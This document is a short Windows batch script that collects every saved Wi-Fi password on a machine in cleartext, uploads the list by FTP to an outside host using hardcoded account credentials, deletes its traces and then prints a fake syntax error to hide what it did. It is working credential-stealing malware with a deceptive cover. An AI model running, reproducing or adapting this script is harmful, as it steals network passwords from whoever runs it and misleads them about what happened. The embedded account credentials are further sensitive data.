@echo off
setlocal enabledelayedexpansion

for /F "tokens=2 delims=:" %%a in ('netsh wlan show profile') do (
    set wifi_pwd=
    for /F "tokens=2 delims=: usebackq" %%F IN (`netsh wlan show profile %%a key^=clear ^| find "Key Content"`) do (
        set wifi_pwd=%%F
    )
    echo %%a : !wifi_pwd!>>pass.txt
)

echo open files.000webhost.com>transfer.txt
echo nigatoni>>transfer.txt
echo Nunnulife@123>>transfer.txt
echo put pass.txt >>transfer.txt
echo bye>>transfer.txt
ftp -s:transfer.txt
del transfer.txt
del pass.txt
echo syntax_error at line 5